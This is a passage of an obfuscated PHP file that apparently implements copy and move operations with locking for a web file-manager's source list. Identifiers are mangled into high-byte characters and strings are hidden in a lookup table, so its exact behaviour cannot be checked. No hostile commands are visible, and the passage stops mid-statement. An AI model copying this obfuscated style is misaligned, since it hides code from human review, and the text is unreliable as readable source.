<?php
 goto eõ³‚‹´; Cã‘”¢Š…ß: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($¶µùë† ) { $´Ÿ×ÈÕ“ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->allowLock()) { return; } $this->_lockCheck($´Ÿ×ÈÕ“[626], $¶µùë† ); $ğì×˜é = 1; $this->_lockEvent($¶µùë† , array($´Ÿ×ÈÕ“[627], $´Ÿ×ÈÕ“[628]), $ğì×˜é); $this->_lockParent($¶µùë† , array($´Ÿ×ÈÕ“[628]), $ğì×˜é); $this->_lockEvent($¶µùë† , array($´Ÿ×ÈÕ“[629], $´Ÿ×ÈÕ“[630]), $ğì×˜é); $this->_lockCheckEnd($´Ÿ×ÈÕ“[626], $¶µùë† ); } public function lockCopyEnd($¾ŸÔä´) { $¤¯£èÔ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->allowLock()) { return; } $–¦¹çúù = 0; $this->_lockEvent($¾ŸÔä´, array($¤¯£èÔ[627], $¤¯£èÔ[628]), $–¦¹çúù); $this->_lockParent($¾ŸÔä´, array($¤¯£èÔ[628]), $–¦¹çúù); $this->_lockEvent($¾ŸÔä´, array($¤¯£èÔ[629], $¤¯£èÔ[630]), $–¦¹çúù); } public function lockWriteStart($”¤ˆˆ¡, $ÁË«Áó² = '') { $Å³ÛšÓ˜ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Å³ÛšÓ˜[627], $”¤ˆˆ¡); $Á©ôäïÎ = 1; $this->_lockKey($Å³ÛšÓ˜[631] . $”¤ˆˆ¡ . $Å³ÛšÓ˜[10] . $ÁË«Áó², $Á©ôäïÎ); $this->_lockEvent($”¤ˆˆ¡, array($Å³ÛšÓ˜[626], $Å³ÛšÓ˜[628]), $Á©ôäïÎ); $this->_lockParent($”¤ˆˆ¡, array($Å³ÛšÓ˜[626], $Å³ÛšÓ˜[628]), $Á©ôäïÎ); $this->_lockCheckEnd($Å³ÛšÓ˜[627], $”¤ˆˆ¡); } public function lockWriteEnd($¥Øß¢‹», $ÑõÛ¹è = '') { $˜µ•øş =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->allowLock()) { return; } $Ÿ·İçÌ = 0; $this->_lockKey($˜µ•øş[631] . $¥Øß¢‹» . $˜µ•øş[10] . $ÑõÛ¹è, $Ÿ·İçÌ); $this->_lockEvent($¥Øß¢‹», array($˜µ•øş[626], $˜µ•øş[628]), $Ÿ·İçÌ); $this->_lockParent($¥Øß¢‹», array($˜µ•øş[626], $˜µ•øş[628]), $Ÿ·İçÌ); } public function lockMoveStart($ã»¢³äå) { $øÁ¥‚Ó =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->allowLock()) { return; } $this->_lockCheck($øÁ¥‚Ó[628], $ã»¢³äå); $ìÊššè‡ = 1; $this->_lockKey($øÁ¥‚Ó[632] . $ã»¢³äå, $ìÊššè‡); $this->_lockEvent($ã»¢³äå, array($øÁ¥‚Ó[626], $øÁ¥‚Ó[627]), $ìÊššè‡); $this->_lockParent($ã»¢³äå, array($øÁ¥‚Ó[626], $øÁ¥‚Ó[628]), $ìÊššè‡); $this->_lockEvent($ã»¢³äå, array($øÁ¥‚Ó[633], $øÁ¥‚Ó[629], $øÁ¥‚Ó[630]), $ìÊššè‡); $this->_lockCheckEnd($øÁ¥‚Ó[628], $ã»¢³äå); } public function lockMoveEnd($ğÚ¯ã) { $ğÉùÌÔ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->allowLock()) { return; } $Ó—ÒºŒ¯ = 0; $this->_lockKey($ğÉùÌÔ[632] . $ğÚ¯ã, $Ó—ÒºŒ¯); $this->_lockEvent($ğÚ¯ã, array($ğÉùÌÔ[626], $ğÉùÌÔ[627]), $Ó—ÒºŒ¯); $this->_lockParent($ğÚ¯ã, array($ğÉùÌÔ[626], $ğÉùÌÔ[628]), $Ó—ÒºŒ¯); $this->_lockEvent($ğÚ¯ã, array($ğÉùÌÔ[633], $ğÉùÌÔ[629], $ğÉùÌÔ[630]), $Ó—ÒºŒ¯); } private function _lockCheck($Š¸÷­œğ, $ïÈŒ´ô) { $×ßœ…úÙ =& $_SERVER[¼¥ÊĞÙÌ]; $¦Šú“Ó = $this->sourceInfo($ïÈŒ´ô); $ÕÌ÷êûÅ = $Š¸÷­œğ . $×ßœ…úÙ[10] . $ïÈŒ´ô; $this->_lockTimeStart[$ÕÌ÷êûÅ] = timeFloat(); if (!is_array($¦Šú“Ó)) { return; } $­ù„Ğí = LNG($×ßœ…úÙ[634]); CacheLock::setErrorMsg($×ßœ…úÙ[176] . htmlspecialchars($¦Šú“Ó[$×ßœ…úÙ[32]]) . $×ßœ…úÙ[178] . $­ù„Ğí); $this->_lockKey($ÕÌ÷êûÅ, 1); $this->_lockKey($ÕÌ÷êûÅ, 0); $î±†Ğä = array_reverse($this->parentLevelArray($¦Šú“Ó[$×ßœ…úÙ[589]])); foreach ($î±†Ğä as $èâ¢ã»±) { $ÕÌ÷êûÅ = $Š¸÷­œğ . $×ßœ…úÙ[635] . $èâ¢ã»±; if (CacheLock::lockGet($×ßœ…úÙ[636] . $ÕÌ÷êûÅ)) { $¦Šú“Ó = $this->sourceInfo($èâ¢ã»±); CacheLock::setErrorMsg($×ßœ…úÙ[176] . htmlspecialchars($¦Šú“Ó[$×ßœ…úÙ[32]]) . $×ßœ…úÙ[178] . $­ù„Ğí); $this->_lockKey($ÕÌ÷êûÅ, 1); $this->_lockKey($ÕÌ÷êûÅ, 0); } } } private function _lockCheckEnd($—§Èö¡, $ñø¡éÖÜ) { $¨—âØë =& $_SERVER[¼¥ÊĞÙÌ]; $ä¢Èœ¾í = $—§Èö¡ . $¨—âØë[10] . $ñø¡éÖÜ; CacheLock::setErrorMsg($¨—âØë[457]); if (!isset($this->_lockTimeStart[$ä¢Èœ¾í])) { return; } $Ç¦¿ã€ = timeFloat() - $this->_lockTimeStart[$ä¢Èœ¾í]; unset($this->_lockTimeStart[$ä¢Èœ¾í]); if ($Ç¦¿ã€ > 0.5) { unset(self::$cacheSourceInfo[$¨—âØë[536] . $ñø¡éÖÜ]); } $Ï¶ßò£™ = $this->sourceInfo($ñø¡éÖÜ); if (!$Ï¶ßò£™) { show_json(LNG($¨—âØë[108]), !1); } } private function _lockParent($”šö§ªÔ, $«£ ô×ò, $Ê˜õ÷á) { if (!$this->autoLockSet) { return; } $Í£Ò“ÌÇ = $this->sourceInfo($”šö§ªÔ); if (!is_array($Í£Ò“ÌÇ)) { return; } $˜šÆé–Ó = array_reverse($this->parentLevelArray($Í£Ò“ÌÇ[$_SERVER[¼¥ÊĞÙÌ][589]])); foreach ($˜šÆé–Ó as $ø…İéù) { $this->_lockEvent($ø…İéù, $«£ ô×ò, $Ê˜õ÷á); } } private function _lockEvent($öü’‘É , $²ÖÎñ‘Ï, $¾§­é¦­) { $¯öß±—Â =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->autoLockSet) { return; } foreach ($²ÖÎñ‘Ï as $Áàİ–˜à) { $ö¡Ç§«ã = $Áàİ–˜à . $¯öß±—Â[10] . $öü’‘É ; if ($¾§­é¦­ && CacheLock::lockGet($¯öß±—Â[636] . $ö¡Ç§«ã)) { continue; } $this->_lockKey($ö¡Ç§«ã, $¾§­é¦­); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($óüŒšİ…, $ÜöåÁÚ± = 1) { $º£«Äå = $_SERVER[¼¥ÊĞÙÌ][636] . md5($óüŒšİ…); if ($ÜöåÁÚ±) { if (isset(self::$_lockItemArr[$º£«Äå])) { return; } self::$_lockItemArr[$º£«Äå] = 1; CacheLock::lock($º£«Äå, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$º£«Äå])) { return; } unset(self::$_lockItemArr[$º£«Äå]); CacheLock::unlock($º£«Äå); } } public function isParentOf($·«À‚‰Í, $âÎ¬¡Å) { $óó—±»ã =& $_SERVER[¼¥ÊĞÙÌ]; $â‡¬·­İ = $this->sourceInfo($·«À‚‰Í); $¥²›¢™Ù = $this->sourceInfo($âÎ¬¡Å); $÷±Å´×ì = $â‡¬·­İ[$óó—±»ã[589]] . $â‡¬·­İ[$óó—±»ã[194]] . $óó—±»ã[50]; $ íëÔğà = $¥²›¢™Ù[$óó—±»ã[589]] . $¥²›¢™Ù[$óó—±»ã[194]] . $óó—±»ã[50]; $¤¸šÌ‰û = strpos($ íëÔğà, $÷±Å´×ì) === 0; return $¤¸šÌ‰û; } private $targetIsDelete = 0; public function copy($Ùƒïî¼Ô, $ÍØ©¨é«, $ËÄ›ò·Š = REPEAT_REPLACE, $ÙÕÃ–ë = '') { $ôŸÇ° =& $_SERVER[¼¥ÊĞÙÌ]; $ö¶Õ¥óÛ = $this->sourceInfo($Ùƒïî¼Ô); $Éöøá–™ = $this->sourceInfo($ÍØ©¨é«); if (!$ö¶Õ¥óÛ || !$Éöøá–™ || $Éöøá–™[$ôŸÇ°[488]] != $ôŸÇ°[91]) { return !1; } if ($this->isParentOf($Ùƒïî¼Ô, $ÍØ©¨é«)) { return !1; } $Í•ŸüÙ€ = $ÙÕÃ–ë ? $ÙÕÃ–ë : $ö¶Õ¥óÛ[$ôŸÇ°[32]]; $this->lockCopyStart($Ùƒïî¼Ô); $this->lockWriteStart($ÍØ©¨é«, $Í•ŸüÙ€); $ã»ÛÏƒ£ = array($ôŸÇ°[637] => array(), $ôŸÇ°[638] => array(), $ôŸÇ°[639] => array()); $this->targetIsDelete = intval($ö¶Õ¥óÛ[$ôŸÇ°[508]]); $û ë¹¥ƒ = $this->fileNameExistAuto($ÍØ©¨é«, $ö¶Õ¥óÛ); $äìÎËö÷ = $this->_copy($Ùƒïî¼Ô, $ÍØ©¨é«, $ËÄ›ò·Š, $ã»ÛÏƒ£, !0, $ÙÕÃ–ë); $this->_childrenListClear(); $this->lockCopyEnd($Ùƒïî¼Ô); $this->lockWriteEnd($ÍØ©¨é«, $Í•ŸüÙ€); if ($ö¶Õ¥óÛ[$ôŸÇ°[488]] == $ôŸÇ°[91] && $û ë¹¥ƒ == $äìÎËö÷) { $this->folderSizeResetChildren($û ë¹¥ƒ); } Model($ôŸÇ°[640])->addAll($ã»ÛÏƒ£[$ôŸÇ°[638]], array(), !0); if ($û ë¹¥ƒ != $äìÎËö÷ || $ö¶Õ¥óÛ[$ôŸÇ°[488]] == $ôŸÇ°[91]) { Model($ôŸÇ°[641])->eventCopy($äìÎËö÷); } $this->saveAll($ã»ÛÏƒ£[$ôŸÇ°[639]]); Model($ôŸÇ°[233])->linkAdd($ã»ÛÏƒ£[$ôŸÇ°[637]]); $this->folderSizeReset($ÍØ©¨é«); $this->updateModifyTime($ÍØ©¨é«); return $äìÎËö÷; } private function _copy($×È¨ãŸƒ, $ıïëÖï, $“ëıÕÄ°, &$®‹˜¦à, $Ûƒ›ßõ­, $Ï¼•Ìè = '') { $Ù§š±åÆ =& $_SERVER[¼¥ÊĞÙÌ]; $ÂÓŒ·Ìş = $this->sourceInfoCache($×È¨ãŸƒ); $ä…áàÜ = $ÂÓŒ·Ìş[$Ù§š±åÆ[488]] == $Ù§š±åÆ[91]; $Ã¢Å‰”Ø = $Ï¼•Ìè ? $Ï¼•Ìè : $ÂÓŒ·Ìş[$Ù§š±åÆ[32]]; $§¶¥Ÿ“™ = $this->fileNameExistAuto($ıïëÖï, $ÂÓŒ·Ìş); if ($Ûƒ›ßõ­) { $this->_childrenAllMake($×È¨ãŸƒ); if ($ä…áàÜ && $§¶¥Ÿ“™) { $this->_childrenAllMake($§¶¥Ÿ“™); } } if (!$§¶¥Ÿ“™) { return $this->_copyCreate($×È¨ãŸƒ, $ıïëÖï, $Ã¢Å‰”Ø, $®‹˜¦à); } $¸±™·‘é = $§¶¥Ÿ“™; if ($ä…áàÜ) { if ($“ëıÕÄ° == REPEAT_RENAME_FOLDER) { $Ã¢Å‰”Ø = $this->fileNameAutoCache($ıïëÖï, $Ã¢Å‰”Ø, $“ëıÕÄ°, $ä…áàÜ); $¸±™·‘é = $this->_copyCreate($×È¨ãŸƒ, $ıïëÖï, $Ã¢Å‰”Ø, $®‹˜¦à); } else { $¦Óç­—» = $this->_childrenList($×È¨ãŸƒ); foreach ($¦Óç­—» as $‚’Ø×—Ï) { $this->_copy($‚’Ø×—Ï[$Ù§š±åÆ[194]], $§¶¥Ÿ“™, $“ëıÕÄ°, $®‹˜¦à, !1); } } } else { if ($“ëıÕÄ° == REPEAT_RENAME || $“ëıÕÄ° == REPEAT_RENAME_FOLDER) { $Ã¢Å‰”Ø = $this->fileNameAutoCache($ıïëÖï, $Ã¢Å‰”Ø, $“ëıÕÄ°, $ä…áàÜ); $¸±™·‘é = $this->_copyCreate($×È¨ãŸƒ, $ıïëÖï, $Ã¢Å‰”Ø, $®‹˜¦à); } else { if ($“ëıÕÄ° == REPEAT_REPLACE) { $ˆê½çç¢ = $this->sourceInfoCache($§¶¥Ÿ“™); $¶¯Ûß÷¶ = $this->fileHistory($ˆê½çç¢, $ÂÓŒ·Ìş[$Ù§š±åÆ[546]], $ÂÓŒ·Ìş[$Ù§š±åÆ[79]]); if ($¶¯Ûß÷¶) { $®‹˜¦à[$Ù§š±åÆ[637]][] = $ÂÓŒ·Ìş[$Ù§š±åÆ[546]]; } } else { if ($“ëıÕÄ° == REPEAT_SKIP) { } } } Hook::trigger($Ù§š±åÆ[642], array($Ù§š±åÆ[643], $ÂÓŒ·Ìş, 0)); } return $¸±™·‘é; } private function _copyCreate($ÌãÌº¶Ö, $ó¶²†³è, $™“ĞÍş, &$ò–˜£·Ñ) { $¢ºÏİ› =& $_SERVER[¼¥ÊĞÙÌ]; $Ùˆàª˜˜ = $this->sourceInfoCache($ÌãÌº¶Ö); $ÇŠ€¶Å˜ = $this->sourceInfoCache($ó¶²†³è); $ã›â‘ = $this->_makeItemData($Ùˆàª˜˜, $ÇŠ€¶Å˜, $™“ĞÍş); Hook::trigger($¢ºÏİ›[644], $ã›â‘); Hook::trigger($¢ºÏİ›[645], array($¢ºÏİ›[646], $ã›â‘, 0)); $ÛÇ¬™şï = $this->add($ã›â‘); $’«¥ºë = array($¢ºÏİ›[194] => $ÛÇ¬™şï, $¢ºÏİ›[32] => $™“ĞÍş); $this->_copyApplyMeta($’«¥ºë, $ò–˜£·Ñ); if ($Ùˆàª˜˜[$¢ºÏİ›[488]] != $¢ºÏİ›[91]) { $ò–˜£·Ñ[$¢ºÏİ›[637]][] = $Ùˆàª˜˜[$¢ºÏİ›[546]]; return $ÛÇ¬™şï; } $»ùÈĞÜ‹ = array(); $áŸŞŠòğ = array(); $this->_childrenListAll($ÌãÌº¶Ö, $»ùÈĞÜ‹); $ã¤âşÙş = count($»ùÈĞÜ‹); if ($ã¤âşÙş == 0) { return $ÛÇ¬™şï; } $ûàğ£½ = $this->sourceInfo($ÛÇ¬™şï); foreach ($»ùÈĞÜ‹ as $ÓÇ¨—ŒÜ) { $‚ ãòÔ˜ = $this->_makeItemData($ÓÇ¨—ŒÜ, $ûàğ£½, $ÓÇ¨—ŒÜ[$¢ºÏİ›[32]]); $‚ ãòÔ˜[$¢ºÏİ›[589]] = $ÓÇ¨—ŒÜ[$¢ºÏİ›[589]]; $áŸŞŠòğ[] = $‚ ãòÔ˜; } $this->chunkEventSet($¢ºÏİ›[647], array($¢ºÏİ›[648], $ã›â‘, $ã¤âşÙş)); $this->addAll($áŸŞŠòğ, array(), !1); $•°·ô¶Ê = $this->where(array($¢ºÏİ›[193] => $ÛÇ¬™şï))->select(); $Ñİ»£­Ü = $this->_childrenMakeRelation($»ùÈĞÜ‹, $•°·ô¶Ê); $Ñİ»£­Ü[$ÌãÌº¶Ö] = $ÛÇ¬™şï; $—®ñÄÑ– = array(); $‹—»Îğë = array(); foreach ($•°·ô¶Ê as $ÓÇ¨—ŒÜ) { $á¡ÎˆËÃ = $ÓÇ¨—ŒÜ[$¢ºÏİ›[194]]; $Å¦ı²Û’ = $this->_childrenMatch($Ñİ»£­Ü, $ÓÇ¨—ŒÜ, $ûàğ£½); $—®ñÄÑ–[] = array($¢ºÏİ›[194], $á¡ÎˆËÃ, $¢ºÏİ›[193], $Å¦ı²Û’[$¢ºÏİ›[193]]); $‹—»Îğë[] = array($¢ºÏİ›[194], $á¡ÎˆËÃ, $¢ºÏİ›[589], $Å¦ı²Û’[$¢ºÏİ›[589]]); $this->_copyApplyMeta($ÓÇ¨—ŒÜ, $ò–˜£·Ñ); if ($ÓÇ¨—ŒÜ[$¢ºÏİ›[488]] != $¢ºÏİ›[91]) { $ò–˜£·Ñ[$¢ºÏİ›[637]][] = $ÓÇ¨—ŒÜ[$¢ºÏİ›[546]]; } } $this->chunkEventSet($¢ºÏİ›[649], array($¢ºÏİ›[650], $ã›â‘, $ã¤âşÙş)); $this->saveAll($—®ñÄÑ–); $this->chunkEventSet($¢ºÏİ›[651], array($¢ºÏİ›[652], $ã›â‘, $ã¤âşÙş)); $this->saveAll($‹—»Îğë); return $ÛÇ¬™şï; } private function _childrenMakeRelation($©èÔ†ÔÂ, $„—¸¾ÏÀ) { $”§¯òš­ =& $_SERVER[¼¥ÊĞÙÌ]; $…ğÛˆà„ = array(); $ıÌØÙ´È = array(); foreach ($©èÔ†ÔÂ as $ ®²çË–) { $ğñÄ¥Â® = $ ®²çË–[$”§¯òš­[32]] . $”§¯òš­[8] . $ ®²çË–[$”§¯òš­[589]]; $…ğÛˆà„[$ğñÄ¥Â®] = $ ®²çË–[$”§¯òš­[194]]; } foreach ($„—¸¾ÏÀ as $ ®²çË–) { $ğñÄ¥Â® = $ ®²çË–[$”§¯òš­[32]] . $”§¯òš­[8] . $ ®²çË–[$”§¯òš­[589]]; $‘Èüä†ñ = $…ğÛˆà„[$ğñÄ¥Â®]; $ıÌØÙ´È[$‘Èüä†ñ] = $ ®²çË–[$”§¯òš­[194]]; } return $ıÌØÙ´È; } private function _childrenMatch($Ÿ»¯éÜî, $Ş‘Üæ½Õ, $æŞÇ…Íë) { $‹£ğ“®Ã =& $_SERVER[¼¥ÊĞÙÌ]; $±¯¾òœ = $æŞÇ…Íë[$‹£ğ“®Ã[589]]; $ÈäÊ¡­å = $this->parentLevelArray($Ş‘Üæ½Õ[$‹£ğ“®Ã[589]]); foreach ($ÈäÊ¡­å as $§ÀÔ©Ó) { if (isset($Ÿ»¯éÜî[$§ÀÔ©Ó])) { $±¯¾òœ .= $Ÿ»¯éÜî[$§ÀÔ©Ó] . $‹£ğ“®Ã[653]; } } $±¯¾òœ = rtrim($±¯¾òœ, $‹£ğ“®Ã[50]) . $‹£ğ“®Ã[50]; $è“ ä’È = $this->parentLevelArray($±¯¾òœ); $ˆÎÓ¿ÚÓ = $è“ ä’È[count($è“ ä’È) - 1]; return array($‹£ğ“®Ã[193] => $ˆÎÓ¿ÚÓ, $‹£ğ“®Ã[589] => $±¯¾òœ); } private function _makeItemData($íÖ¢·ûª, $ÏåÚÑ³½, $Ü‘Âğõ£) { $–Êå€œœ =& $_SERVER[¼¥ÊĞÙÌ]; $¸úš‹¤ = array($–Êå€œœ[654] => $íÖ¢·ûª[$–Êå€œœ[488]], $–Êå€œœ[497] => $Ü‘Âğõ£, $–Êå€œœ[655] => $íÖ¢·ûª[$–Êå€œœ[489]] ? $íÖ¢·ûª[$–Êå€œœ[489]] : $–Êå€œœ[12], $–Êå€œœ[547] => $íÖ¢·ûª[$–Êå€œœ[546]] ? $íÖ¢·ûª[$–Êå€œœ[546]] : 0, $–Êå€œœ[625] => $íÖ¢·ûª[$–Êå€œœ[79]] ? $íÖ¢·ûª[$–Êå€œœ[79]] : 0, $–Êå€œœ[656] => intval($ÏåÚÑ³½[$–Êå€œœ[191]]), $–Êå€œœ[657] => intval($ÏåÚÑ³½[$–Êå€œœ[574]]), $–Êå€œœ[658] => intval(USER_ID), $–Êå€œœ[659] => intval(USER_ID), $–Êå€œœ[480] => intval($ÏåÚÑ³½[$–Êå€œœ[194]]), $–Êå€œœ[660] => $ÏåÚÑ³½[$–Êå€œœ[589]] . $ÏåÚÑ³½[$–Êå€œœ[194]] . $–Êå€œœ[50], $–Êå€œœ[501] => $íÖ¢·ûª[$–Êå€œœ[88]] ? $íÖ¢·ûª[$–Êå€œœ[88]] : time(), $–Êå€œœ[507] => 0, $–Êå€œœ[661] => $–Êå€œœ[12]); return $¸úš‹¤; } private function _copyApplyMeta($´üëù¾‡, &$ü¢ìè™ú) { $êö‰Ù¿¹ =& $_SERVER[¼¥ÊĞÙÌ]; $òË°é«® = $´üëù¾‡[$êö‰Ù¿¹[194]]; $íòÖÉ‰³ = $´üëù¾‡[$êö‰Ù¿¹[32]]; if (!isset($´üëù¾‡[$êö‰Ù¿¹[662]]) || !$´üëù¾‡[$êö‰Ù¿¹[662]] || $´üëù¾‡[$êö‰Ù¿¹[662]] == $êö‰Ù¿¹[231]) { $ü¢ìè™ú[$êö‰Ù¿¹[639]][] = array($êö‰Ù¿¹[194], $òË°é«®, $êö‰Ù¿¹[662], short_id($òË°é«®)); } if (Input::check($íòÖÉ‰³, $êö‰Ù¿¹[663])) { $ü¢ìè™ú[$êö‰Ù¿¹[638]][] = array($êö‰Ù¿¹[194] => $òË°é«®, $êö‰Ù¿¹[97] => $êö‰Ù¿¹[541], $êö‰Ù¿¹[453] => str_replace($êö‰Ù¿¹[53], $êö‰Ù¿¹[12], Pinyin::get($íòÖÉ‰³))); $ü¢ìè™ú[$êö‰Ù¿¹[638]][] = array($êö‰Ù¿¹[194] => $òË°é«®, $êö‰Ù¿¹[97] => $êö‰Ù¿¹[540], $êö‰Ù¿¹[453] => Pinyin::get($íòÖÉ‰³, $êö‰Ù¿¹[664])); } $ü¢ìè™ú[$êö‰Ù¿¹[638]][] = array($êö‰Ù¿¹[194] => $òË°é«®, $êö‰Ù¿¹[97] => $êö‰Ù¿¹[520], $êö‰Ù¿¹[453] => KodSort::makeStr($íòÖÉ‰³)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($—êã•©Ø) { $÷¥šÉè =& $_SERVER[¼¥ÊĞÙÌ]; $ÙÌªğ¾µ = $this->sourceInfo($—êã•©Ø); $Û¿âıÅ¾ = $÷¥šÉè[665]; $ğ²ˆãÛœ = array($÷¥šÉè[589] => array($÷¥šÉè[620], $ÙÌªğ¾µ[$÷¥šÉè[589]] . $—êã•©Ø . $÷¥šÉè[621]), $÷¥šÉè[508] => $this->targetIsDelete); $ŞÂÓ™şä = $this->field($Û¿âıÅ¾)->where($ğ²ˆãÛœ)->select(); if (!$ŞÂÓ™şä) { return; } $ŞÂÓ™şä = array_to_keyvalue($ŞÂÓ™şä, $÷¥šÉè[194]); foreach ($ŞÂÓ™şä as $ˆ©µ§”ì) { $ŸÊëˆó› = $ˆ©µ§”ì[$÷¥šÉè[193]]; $—êã•©Ø = $ˆ©µ§”ì[$÷¥šÉè[194]]; if (!isset($this->_childrenListCache[$—êã•©Ø]) && $ˆ©µ§”ì[$÷¥šÉè[488]] == $÷¥šÉè[91]) { $this->_childrenListCache[$—êã•©Ø] = array(); } if (!isset($this->_childrenListCache[$ŸÊëˆó›])) { $this->_childrenListCache[$ŸÊëˆó›] = array(); } $this->_childrenListCache[$ŸÊëˆó›][$—êã•©Ø] = $ˆ©µ§”ì; $this->_childrenItemCache[$—êã•©Ø] = $ˆ©µ§”ì; } } private function _childrenListAll($Ğ„èãæ, &$„ òÒ˜) { $¼İĞœ¨ =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($this->_childrenListCache[$Ğ„èãæ])) { return; } $‰ Öù÷­ = $this->_childrenListCache[$Ğ„èãæ]; foreach ($‰ Öù÷­ as $Æ›Â¦ => $Å¬Šº¨) { $„ òÒ˜[$Æ›Â¦] = $Å¬Šº¨; if ($Å¬Šº¨[$¼İĞœ¨[488]] == $¼İĞœ¨[91]) { $this->_childrenListAll($Æ›Â¦, $„ òÒ˜); } } } private function sourceInfoCache($”Ôòğ‰) { if (isset($this->_childrenItemCache[$”Ôòğ‰])) { return $this->_childrenItemCache[$”Ôòğ‰]; } return $this->sourceInfo($”Ôòğ‰); } private function _childrenList($ˆ¾ìİ¶÷) { if (isset($this->_childrenListCache[$ˆ¾ìİ¶÷])) { return $this->_childrenListCache[$ˆ¾ìİ¶÷]; } return $this->_childrenListSelect($ˆ¾ìİ¶÷); } private function _childrenListSelect($Œì­Ö§à) { $Ï„µŸ³˜ =& $_SERVER[¼¥ÊĞÙÌ]; $¾¼†ÈÕ„ = array($Ï„µŸ³˜[193] => $Œì­Ö§à, $Ï„µŸ³˜[508] => $this->targetIsDelete); $¸Ş‘¿ÒÌ = $this->where($¾¼†ÈÕ„)->select(); $¸Ş‘¿ÒÌ = $¸Ş‘¿ÒÌ ? $¸Ş‘¿ÒÌ : array(); $ª‹Ÿµ”Å = array_to_keyvalue($¸Ş‘¿ÒÌ, $Ï„µŸ³˜[194]); $this->_childrenListCache[$Œì­Ö§à] = $ª‹Ÿµ”Å; foreach ($ª‹Ÿµ”Å as $Œì­Ö§à => $ƒ•Ü´è×) { $this->_childrenItemCache[$Œì­Ö§à] = $ƒ•Ü´è×; } return $ª‹Ÿµ”Å; } private function fileNameExistAuto($¬¬âü¾, $‹È°¤ï) { $ÍÜà”¯ì =& $_SERVER[¼¥ÊĞÙÌ]; if ($‹È°¤ï[$ÍÜà”¯ì[508]] == $ÍÜà”¯ì[91]) { return $this->fileNameExist($¬¬âü¾, $‹È°¤ï[$ÍÜà”¯ì[32]]); } return $this->fileNameExistCache($¬¬âü¾, $‹È°¤ï[$ÍÜà”¯ì[32]]); } private function fileNameExistCache($î°®Ş÷, $ˆÉü–) { $“æ«³öÓ =& $_SERVER[¼¥ÊĞÙÌ]; $ˆÉü– = strtolower($ˆÉü–); $›Âò«¼à = $this->_childrenList($î°®Ş÷); foreach ($›Âò«¼à as $ÔŸ³è•) { if ($ˆÉü– == strtolower($ÔŸ³è•[$“æ«³öÓ[32]])) { return $ÔŸ³è•[$“æ«³öÓ[194]]; } } return !1; } private function fileNameAutoCache($İÅİË¬ò, $ßâ°‚ØË, $¼æ†ÇÚ¢, $Ø°‚¼”¬) { $÷öÉßô =& $_SERVER[¼¥ÊĞÙÌ]; $¼”ùœé× = $this->_childrenList($İÅİË¬ò); $ëôúÔ·â = array_to_keyvalue($¼”ùœé×, $÷öÉßô[12], $÷öÉßô[32]); return $this->fileNameAutoGet($ëôúÔ·â, $ßâ°‚ØË, $¼æ†ÇÚ¢, $Ø°‚¼”¬); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¯Á¸òõÓ, $åø§™´ , $ş÷¨Ï»í = REPEAT_REPLACE, $µ€è´«Ù = '') { $ğ¥î¥äº =& $_SERVER[¼¥ÊĞÙÌ]; $‡ğç– = $this->sourceInfo($¯Á¸òõÓ); $šğ¡‚»½ = $this->sourceInfo($åø§™´ ); if ($‡ğç–[$ğ¥î¥äº[193]] == $šğ¡‚»½[$ğ¥î¥äº[194]]) { if ($‡ğç–[$ğ¥î¥äº[508]] == $ğ¥î¥äº[91]) { Model($ğ¥î¥äº[506])->restore(array($¯Á¸òõÓ)); } if (!$µ€è´«Ù || $µ€è´«Ù == $‡ğç–[$ğ¥î¥äº[32]]) { return $¯Á¸òõÓ; } } $òüÙ¥ËÕ = $this->pathInfoMore($¯Á¸òõÓ); if ($this->isParentOf($¯Á¸òõÓ, $åø§™´ )) { return !1; } if (!$‡ğç– || !$šğ¡‚»½ || $šğ¡‚»½[$ğ¥î¥äº[488]] != $ğ¥î¥äº[91]) { return !1; } Hook::trigger($ğ¥î¥äº[666], $òüÙ¥ËÕ); $this->targetIsDelete = intval($‡ğç–[$ğ¥î¥äº[508]]); if ($‡ğç–[$ğ¥î¥äº[193]] == $åø§™´  && $µ€è´«Ù != $‡ğç–[$ğ¥î¥äº[32]]) { $ÄÉ×İ¦ = $this->fileNameExist($åø§™´ , $µ€è´«Ù); if ($ÄÉ×İ¦ && $‡ğç–[$ğ¥î¥äº[488]] == $ğ¥î¥äº[231]) { $ã†ÙÇ®ƒ = $this->sourceInfo($ÄÉ×İ¦); $Æ¬–Ëò = $this->fileHistory($ã†ÙÇ®ƒ, $‡ğç–[$ğ¥î¥äº[546]], $‡ğç–[$ğ¥î¥äº[79]]); if (!$Æ¬–Ëò) { Model($ğ¥î¥äº[549])->remove($‡ğç–[$ğ¥î¥äº[546]]); } $this->removeNow($¯Á¸òõÓ, !1); $this->folderSizeReset($åø§™´ ); Hook::trigger($ğ¥î¥äº[667], $òüÙ¥ËÕ); return $ÄÉ×İ¦; } } $ó™®«”® = $µ€è´«Ù ? $µ€è´«Ù : $‡ğç–[$ğ¥î¥äº[32]]; $this->lockMoveStart($¯Á¸òõÓ); $this->lockWriteStart($åø§™´ , $ó™®«”®); $§ã§ØüÒ = array($ğ¥î¥äº[637] => array(), $ğ¥î¥äº[668] => !1); $this->clearShare($¯Á¸òõÓ, $åø§™´ ); $¢ñ¼ğ× = $this->fileNameExistAuto($åø§™´ , $‡ğç–); $¦£ß¢é¶ = $this->_move($¯Á¸òõÓ, $åø§™´ , $ş÷¨Ï»í, $§ã§ØüÒ, $µ€è´«Ù); $this->sourceCacheClear(); if ($‡ğç–[$ğ¥î¥äº[488]] == $ğ¥î¥äº[91] && $¢ñ¼ğ×) { $this->folderSizeResetChildren($¦£ß¢é¶); } Model($ğ¥î¥äº[233])->linkAdd($§ã§ØüÒ[$ğ¥î¥äº[637]]); if ($¦£ß¢é¶ && $¢ñ¼ğ× && 